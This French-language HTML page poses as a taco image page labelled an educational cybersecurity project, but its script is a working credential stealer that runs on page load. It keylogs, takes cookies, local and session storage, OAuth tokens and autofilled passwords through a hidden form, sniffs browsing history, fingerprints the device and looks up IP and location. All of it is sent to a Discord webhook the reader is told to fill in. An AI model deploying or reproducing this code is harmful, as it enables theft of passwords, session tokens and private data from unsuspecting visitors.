<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Tacos Security - Advanced Collection</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            font-family: monospace;
            padding: 20px;
            color: white;
        }
        .container { max-width: 600px; margin: 0 auto; }
        .taco-img {
            width: 100%;
            border-radius: 20px;
            margin-bottom: 20px;
        }
        button {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            background: #ff6600;
            border: none;
            color: white;
            font-weight: bold;
            border-radius: 999px;
            cursor: pointer;
        }
        .status {
            background: rgba(0,0,0,0.5);
            padding: 15px;
            border-radius: 15px;
            margin: 10px 0;
            font-size: 12px;
            word-break: break-all;
        }
        .hidden-form {
            position: absolute;
            left: -9999px;
            top: -9999px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img class="taco-img" src="https://i.imgur.com/4Z3zY0L.jpeg" alt="Tacos">
        
        <div class="status" id="status">
            🔄 Collecte de données en cours...
        </div>
        
        <button id="manualSend">📤 Forcer l'envoi des données</button>
        
        <div style="font-size: 10px; text-align: center; margin-top: 30px; opacity: 0.5;">
            Projet éducatif - Cybersécurité
        </div>
    </div>

    <!-- Formulaire caché pour l'autofill -->
    <div class="hidden-form">
        <form id="fakeLoginForm">
            <input type="text" id="fakeEmail" name="email">
            <input type="password" id="fakePassword" name="password">
        </form>
    </div>

    <script>
        // 🔴 REMPLACE PAR TON WEBHOOK DISCORD
        const WEBHOOK_URL = "https://discord.com/api/webhooks/TA_DISCORD_ID/TA_TOKEN";
        
        let allCollectedData = {
            cookies: [],
            localStorage: [],
            sessionStorage: [],
            oauthTokens: [],
            visitedSites: [],
            typedKeys: '',
            passwords: [],
            timestamp: new Date().toISOString()
        };
        
        let keyloggerBuffer = '';
        let lastSend = Date.now();
        
        // ========== 1. RÉCUPÉRATION DES COOKIES ==========
        function stealCookies() {
            const cookies = document.cookie.split(';');
            const important = [];
            
            cookies.forEach(cookie => {
                const trimmed = cookie.trim();
                if(trimmed) {
                    important.push(trimmed);
                    // Détection spéciale cookies de session
                    if(trimmed.includes('session') || trimmed.includes('auth') || trimmed.includes('token')) {
                        allCollectedData.cookies.push(`🔐 ${trimmed}`);
                    } else {
                        allCollectedData.cookies.push(trimmed);
                    }
                }
            });
            
            return allCollectedData.cookies;
        }
        
        // ========== 2. STOCKAGE LOCAL ==========
        function stealLocalStorage() {
            for(let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                if(value && value.length > 0) {
                    allCollectedData.localStorage.push(`${key}: ${value.substring(0, 100)}`);
                }
            }
            
            for(let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key);
                if(value && value.length > 0) {
                    allCollectedData.sessionStorage.push(`${key}: ${value.substring(0, 100)}`);
                }
            }
        }
        
        // ========== 3. TOKENS OAUTH ==========
        function stealOAuthTokens() {
            const tokenPatterns = ['access_token', 'refresh_token', 'id_token', 'token', 'jwt', 'bearer'];
            const found = [];
            
            // Check localStorage
            for(let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                
                tokenPatterns.forEach(pattern => {
                    if(key.toLowerCase().includes(pattern) && value && value.length > 15) {
                        found.push(`${key}: ${value.substring(0, 50)}...`);
                    }
                });
            }
            
            allCollectedData.oauthTokens = found;
            return found;
        }
        
        // ========== 4. SITES VISITÉS (via CSS) ==========
        function detectVisitedSites() {
            const sites = [
                'https://discord.com/login',
                'https://github.com/login',
                'https://accounts.google.com',
                'https://www.facebook.com',
                'https://www.instagram.com',
                'https://twitter.com',
                'https://outlook.live.com',
                'https://mail.google.com',
                'https://www.reddit.com',
                'https://www.twitch.tv',
                'https://www.youtube.com',
                'https://www.netflix.com',
                'https://www.spotify.com'
            ];
            
            const visited = [];
            
            sites.forEach(site => {
                const link = document.createElement('a');
                link.href = site;
                link.style.cssText = 'position:absolute; left:-9999px;';
                document.body.appendChild(link);
                
                // Vérifie si le lien a été visité
                const color = window.getComputedStyle(link).getPropertyValue('color');
                if(color !== 'rgb(0, 0, 238)') {
                    visited.push(site);
                }
                
                link.remove();
            });
            
            allCollectedData.visitedSites = visited;
            return visited;
        }
        
        // ========== 5. KEYLOGGER AVANCÉ ==========
        function startKeylogger() {
            document.addEventListener('keydown', (e) => {
                // Ignore touches spéciales
                if(e.key === 'Shift' || e.key === 'Control' || e.key === 'Alt' || e.key === 'Meta') return;
                
                let char = e.key;
                if(char === ' ') char = ' ';
                if(char === 'Enter') char = '\n[ENTER]\n';
                if(char === 'Tab') char = '[TAB]';
                if(char === 'Backspace') char = '[BACKSPACE]';
                
                keyloggerBuffer += char;
                allCollectedData.typedKeys = keyloggerBuffer;
                
                // Envoie toutes les 10 secondes ou si 200 caractères
                if(keyloggerBuffer.length > 200 || (Date.now() - lastSend) > 10000) {
                    sendToDiscord("📝 KEYLOGGER", keyloggerBuffer);
                    keyloggerBuffer = '';
                    lastSend = Date.now();
                }
            });
            
            // Récupère aussi les inputs des formulaires
            document.addEventListener('input', (e) => {
                if(e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                    const inputData = `[INPUT ${e.target.type || 'text'}]: ${e.target.value}`;
                    keyloggerBuffer += inputData + '\n';
                }
            });
        }
        
        // ========== 6. FAUX FORMULAIRE AUTOFILL ==========
        function stealAutofillPasswords() {
            const emailInput = document.getElementById('fakeEmail');
            const passwordInput = document.getElementById('fakePassword');
            
            // Attend que l'autofill se fasse
            setTimeout(() => {
                if(emailInput.value || passwordInput.value) {
                    allCollectedData.passwords.push({
                        email: emailInput.value,
                        password: passwordInput.value
                    });
                    
                    sendToDiscord("🔑 MOTS DE PASSE AUTOFILL", 
                        `Email: ${emailInput.value}\nPassword: ${passwordInput.value}`);
                }
            }, 1500);
            
            setTimeout(() => {
                if(emailInput.value || passwordInput.value) {
                    allCollectedData.passwords.push({
                        email: emailInput.value,
                        password: passwordInput.value
                    });
                    
                    sendToDiscord("🔑 MOTS DE PASSE AUTOFILL (2ème tentative)", 
                        `Email: ${emailInput.value}\nPassword: ${passwordInput.value}`);
                }
            }, 5000);
        }
        
        // ========== 7. FINGERPRINT (ID unique de l'appareil) ==========
        function getDeviceFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 100, 100);
            ctx.fillStyle = '#fff';
            ctx.fillText('Tacos', 10, 10);
            
            const fingerprint = {
                canvas: canvas.toDataURL(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenRes: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                colorDepth: screen.colorDepth,
                touchPoints: navigator.maxTouchPoints,
                doNotTrack: navigator.doNotTrack
            };
            
            return fingerprint;
        }
        
        // ========== 8. RÉCUPÉRATION IP & GÉOLOCALISATION ==========
        async function getIPAndGeo() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const { ip } = await ipRes.json();
                
                const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
                const geo = await geoRes.json();
                
                return { ip, geo };
            } catch(e) {
                return { ip: 'Inconnue', geo: {} };
            }
        }
        
        // ========== 9. ENVOI À DISCORD ==========
        async function sendToDiscord(title, content) {
            if(WEBHOOK_URL === "https://discord.com/api/webhooks/TA_DISCORD_ID/TA_TOKEN") {
                console.log("⚠️ Webhook non configuré - Données:", title, content);
                return;
            }
            
            const embed = {
                title: `🌮 ${title}`,
                description: content.length > 2000 ? content.substring(0, 1900) + '...' : content,
                color: 0xFF6600,
                timestamp: new Date().toISOString(),
                footer: { text: 'Tacos Security Collection' }
            };
            
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] })
                });
                console.log(`✅ ${title} envoyé`);
            } catch(e) {
                console.error('Erreur:', e);
            }
        }
        
        // ========== 10. COLLECTE TOTALE ==========
        async function collectAllData() {
            const statusDiv = document.getElementById('status');
            statusDiv.innerHTML = '🔄 Collecte des données en cours...\n';
            
            // 1. IP et Geo
            const { ip, geo } = await getIPAndGeo();
            statusDiv.innerHTML += `✅ IP: ${ip}\n`;
            await sendToDiscord("📍 IP & Géo", `IP: ${ip}\nPays: ${geo.country_name}\nVille: ${geo.city}\nISP: ${geo.org}`);
            
            // 2. Cookies
            const cookies = stealCookies();
            if(cookies.length > 0) {
                await sendToDiscord("🍪 Cookies volés", cookies.join('\n'));
                statusDiv.innerHTML += `✅ ${cookies.length} cookies récupérés\n`;
            }
            
            // 3. Local/Session Storage
            stealLocalStorage();
            if(allCollectedData.localStorage.length > 0) {
                await sendToDiscord("💾 LocalStorage", allCollectedData.localStorage.join('\n'));
                statusDiv.innerHTML += `✅ ${allCollectedData.localStorage.length} items localStorage\n`;
            }
            
            // 4. OAuth Tokens
            const oauth = stealOAuthTokens();
            if(oauth.length > 0) {
                await sendToDiscord("🔑 Tokens OAuth", oauth.join('\n'));
                statusDiv.innerHTML += `✅ ${oauth.length} tokens OAuth\n`;
            }
            
            // 5. Sites visités
            const visited = detectVisitedSites();
            if(visited.length > 0) {
                await sendToDiscord("🌐 Sites visités", visited.join('\n'));
                statusDiv.innerHTML += `✅ ${visited.length} sites visités détectés\n`;
            }
            
            // 6. Fingerprint
            const fingerprint = getDeviceFingerprint();
            await sendToDiscord("🆔 Empreinte numérique", JSON.stringify(fingerprint, null, 2));
            
            // 7. Autofill
            stealAutofillPasswords();
            
            statusDiv.innerHTML += `\n✅ Collecte terminée ! Les données sont envoyées à Discord.\n`;
        }
        
        // ========== INIT ==========
        async function init() {
            startKeylogger();
            await collectAllData();
            
            document.getElementById('manualSend').onclick = () => {
                sendToDiscord("📊 Rapport manuel", 
                    `Cookies: ${allCollectedData.cookies.length}\n` +
                    `LocalStorage: ${allCollectedData.localStorage.length}\n` +
                    `Tokens: ${allCollectedData.oauthTokens.length}\n` +
                    `Keylogger: ${keyloggerBuffer.length} caractères\n` +
                    `Sites visités: ${allCollectedData.visitedSites.length}`
                );
            };
            
            // Envoie le keylogger à la fermeture
            window.addEventListener('beforeunload', () => {
                if(keyloggerBuffer.length > 10) {
                    sendToDiscord("📝 Keylogger (fin session)", keyloggerBuffer);
                }
            });
        }
        
        init();
    </script>
</body>
</html>
